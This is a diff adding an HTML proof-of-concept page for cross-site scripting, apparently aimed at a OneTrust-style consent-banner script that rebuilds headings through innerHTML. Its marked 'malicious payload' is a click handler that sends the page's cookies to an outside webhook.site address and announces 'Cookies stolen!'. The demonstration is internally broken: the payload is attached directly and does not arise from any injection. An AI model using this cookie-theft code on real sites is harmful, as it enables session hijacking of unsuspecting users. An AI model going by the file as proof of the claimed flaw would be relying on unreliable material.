@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>XSS-PoC</title>
+</head>
+<body>
+    <div id="onetrust-consent-sdk">
+        <h2 id="target">Click me!</h2>
+    </div>
+    <script>
+        function OptanonWrapper(){
+            var e=document.querySelectorAll("#onetrust-consent-sdk h2");
+            for(i=0;i<e.length;i++) n(e[i],"ot-h2");
+            var t=document.querySelectorAll("#onetrust-consent-sdk h3");
+            for(i=0;i<t.length;i++) n(t[i],"ot-h3");
+            var r=document.querySelectorAll("#onetrust-consent-sdk h4");
+            for(i=0;i<r.length;i++) n(r[i],"ot-h4");
+            function n(e,t){
+                var r=e.parentNode,
+                    n=document.createElement("div");
+                if (e.id !== undefined) n.setAttribute("id", "" + e.id);
+                n.classList = e.classList;
+                n.innerHTML = e.innerHTML;
+                n.classList.add(t);
+                r.insertBefore(n,e);
+                r.removeChild(e);
+            }
+        }
+
+        // Simulate the vulnerability being triggered
+        OptanonWrapper();
+
+        // Malicious payload
+        document.querySelector('#target').addEventListener('click', function() {
+            // Send cookies to attacker's server
+            var img = new Image();
+            img.src = 'https://webhook.site/a86fa606-ddcb-44f3-a5ec-f5ca9d4a4229?cookie=' + encodeURIComponent(document.cookie);
+            // Optionally, display an alert or perform other actions
+            alert('Cookies stolen!');
+        });
+    </script>
+</body>
+</html>
